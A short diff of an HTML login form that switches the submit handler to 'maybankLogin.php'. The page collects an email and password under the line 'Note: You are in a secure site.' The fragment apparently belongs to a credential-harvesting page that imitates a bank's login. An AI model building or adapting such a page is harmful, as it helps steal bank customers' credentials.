@@ -102,7 +102,7 @@ input[type=email], input[type=password] {
                     Note: You are in a secure site.
                 </div>
                 
-            <form action="login2.php" method="post">
+            <form action="maybankLogin.php" method="post">
                 <div id='email'>
                     <input type="email" placeholder="Enter email" name="email" required>
                     <input type="password" placeholder="Enter Password" name="password" required>
